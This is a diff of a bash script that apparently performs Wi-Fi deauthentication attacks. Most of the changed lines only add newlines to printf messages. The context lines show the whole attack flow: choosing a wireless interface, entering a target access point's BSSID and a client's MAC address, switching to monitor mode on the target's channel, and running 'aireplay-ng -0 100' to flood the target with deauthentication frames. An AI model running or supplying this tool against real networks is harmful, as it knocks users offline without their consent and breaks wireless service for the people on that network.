@@ -87,7 +87,7 @@ wireless_interfaces=($(iwconfig 2>/dev/null | grep -E '^[[:alnum:]]+\s+IEEE 802\
 
 # Check if there are no wireless interfaces
 if [ ${#wireless_interfaces[@]} -eq 0 ]; then
-    printf "No wireless interfaces found."
+    printf "No wireless interfaces found.\n"
     exit 1
 fi
 
@@ -100,9 +100,9 @@ for interface in "${wireless_interfaces[@]}"; do
 done
 
 # Display the menu
-printf "Select a wireless interface:"
+printf "Select a wireless interface:\n"
 for key in "${!interface_map[@]}"; do
-    printf "$key: ${interface_map[$key]}"
+    echo "$key: ${interface_map[$key]}"
 done
 
 # Prompt the user for their choice
@@ -112,7 +112,7 @@ read -p "Enter the number of the wireless interface you want to use: " choice
 if [[ -n ${interface_map[$choice]} ]]; then
     ITMP="${interface_map[$choice]}"
 else
-    printf "Invalid choice. Please enter a valid number."
+    printf "Invalid choice. Please enter a valid number.\n"
     custom_exit
 fi
 
@@ -144,7 +144,7 @@ if ! grep -qE '54:E0:19|5C:47:5E|9C:76:13|34:3E:A4|64:9A:63|90:48:6C' /tmp/rdos/
                 custom_exit
                 ;;
             *)
-                printf "Invalid choice. Please enter 'y' or 'n'."
+                printf "Invalid choice. Please enter 'y' or 'n'.\n"
                 ;;
         esac
     done
@@ -163,7 +163,7 @@ printf "\n"
 read -p "Enter BSSID of target: " BSSID
 read -p "Enter MAC of target: " MAC
 CHNL=$(awk -F, -v BSSID="$BSSID" '$0 ~ BSSID {split($0, fields, ",");channel = gensub(/[^0-9]+/, "", "g", fields[4]); if (channel <= 13) print channel}' /tmp/rdos/$RESULT)
-printf "Setting the monitor channel to the same channel the target AP is on..."
+printf "Setting the monitor channel to the same channel the target AP is on...\n"
 sudo airmon-ng stop $INF
 sudo airmon-ng start $ITMP $CHNL
 sudo aireplay-ng -0 100 -a $BSSID -c $MAC $INF 
